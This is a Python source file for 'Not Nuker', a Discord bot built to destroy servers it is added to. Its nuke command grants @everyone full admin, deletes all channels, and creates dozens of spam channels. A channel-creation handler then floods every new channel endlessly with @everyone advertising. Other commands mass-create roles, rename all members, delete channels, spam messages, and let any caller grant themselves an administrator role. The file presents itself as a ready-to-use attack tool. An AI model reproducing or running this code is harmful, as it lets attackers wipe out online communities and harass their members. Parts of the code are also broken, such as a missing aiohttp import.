import discord
import os
import random
import json
from discord.ext import commands
from discord import Permissions
from discord.ext.commands import MissingPermissions
from pystyle import Colorate, Colors

intents = discord.Intents.all()
intents.members = True

config = r"notnuker.json"

with open(config, 'r') as f:
    config = json.load(f)
    server_name = config["server_name"]
    token = config["token"]
    bot_status = config["bot_status"]

SPAM_CHANNEL = ["Not Nuker Runs U"]
SPAM_MESSAGE = [
    "@everyone nuked by NOT NUKER join to get this nuker https://discord.gg/q6WmwPn9rh"
]

client = commands.Bot(command_prefix="?")

os.system('cls')


def _print(text):
    print(Colorate.Horizontal(Colors.blue_to_purple, text))                     


def banner():
    _print('''

 __  _  __ _____   __  _ _  _ _  _____ ___  
|  \| |/__\_   _| |  \| | || | |/ / __| _ \ 
| | ' | \/ || |   | | ' | \/ |   <| _|| v / 
|_|\__|\__/ |_|   |_|\__|\__/|_|\_\___|_|_\ 

           Made By Praneeth Reddy
''')


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=bot_status))
    os.system(f'cls & mode 81,25 & title Ayo ')
    banner()

client.remove_command("help")

@client.command(pass_context=True)
async def meme(ctx):
    embed = discord.Embed(title="", description="")

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
            res = await r.json()
            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
            await ctx.send(embed=embed)

@client.event
async def on_connect():
    print(f"Connected with {client.user}\nCreated by NOT NUKER")
    await client.change_presence(
        activity=discord.Streaming(name=f"NOT NUKER", url="https://yoututube.com"))

@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx,member : discord.Member,*,reason= "No Reason Provided"):
    await ctx.send(member.name + " has been from banned **????N ????????** server for "+reason)
    await member.ban(reason=reason)
      



@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)
    print(f"spam cmd done")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have permissions to use this command")
        _print("You don't have permissions to use this command")
    else:
        await ctx.send("Invalid Command")
        _print("Invalid Command")


@client.command()
async def endbotlife(ctx):
    await ctx.message.delete()
    msg = await ctx.send(f"Restarting '{client.user.name}'...")
    await msg.delete()
    os.system("ZoloNuker.py")
    exit()

@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NOT NUKER RUNS U")
      print(f"\x1b[38;5;34mCreated Role {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command()
async def purge(ctx, amount=500):
    await ctx.channel.purge(limit=amount)

@client.command()
async def admin(ctx):
    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name="notnuker", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()

@client.command()
async def partner(ctx):
  await ctx.send("PARTNER is https://discord.gg/K6Gd6zfG ")

@client.command()
async def hello(ctx):
    await ctx.send("hello :wave:")

@client.command()
async def spamlink9(ctx):
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("spam")
  await ctx.send("Spam Done")


@client.command()
async def banall(ctx):
  await ctx.send("Connecing To NotNuker Data Base")
  await ctx.send("Injeccting BAN ALL PACKETS")
  await ctx.send("trying to ban")
  await ctx.send("ban failed :(")



@client.command()
async def updatestatus(ctx):
  await ctx.send("Added Roles Spam")
 
@client.command()
async def nick(ctx, *, name="NOT NUKER ON TOP"):
  print("Changed your nick")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 
  print(f"succesffully changed your nickname")

@client.command(aliases=["deletechannels"])
async def delchannels(ctx):
   
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return 

@client.command()
async def kick(ctx, member : discord.Member, *, reason=None):
  await member.kick(reason=reason)
  await ctx.message.delete()

@client.command(name='help')
async def help(ctx):
  embed = discord.Embed(
    title = 'Welcome to Not Nuker Update V4',
    description = 'Not Nuker Commands',
    color = discord.Color.purple()
  )
  embed.add_field(name='?rolespam',value='Spams Roles')
  embed.add_field(name='?nuke',value='Begins nuking the server')
  embed.add_field(name='?admin',value='gives u admin to the server')
  embed.add_field(name='?ban',value='Use: ?ban @user')
  embed.add_field(name='?spam',value='USAGE: ?spam 100 text of spam')
  embed.add_field(name='?hello',value='send hello')
  embed.add_field(name='?partner',value='shows partner')
  embed.add_field(name='?help',value='shows this message')
  embed.add_field(name='?banall',value='Bans all not redy + may not work')
  await ctx.send(embed=embed)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.edit(name=server_name)
    _print(f"'{client.user.name}'server was changed to " + server_name)
    _print(f"'{ctx.author}' ran this command.")
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        _print("I have given everyone admin.")
    except:
        _print("I was unable to give everyone admin")
    for channel in guild.channels:
        try:
            await channel.delete()
            _print(f"{channel.name} was deleted.")
        except:
            _print(f"{channel.name} was NOT deleted.")
                   
    await guild.create_text_channel("not nuker on TOP!")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        _print(f"New Invite: {link}")
    amount = 65
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))



client.run(token, bot=True)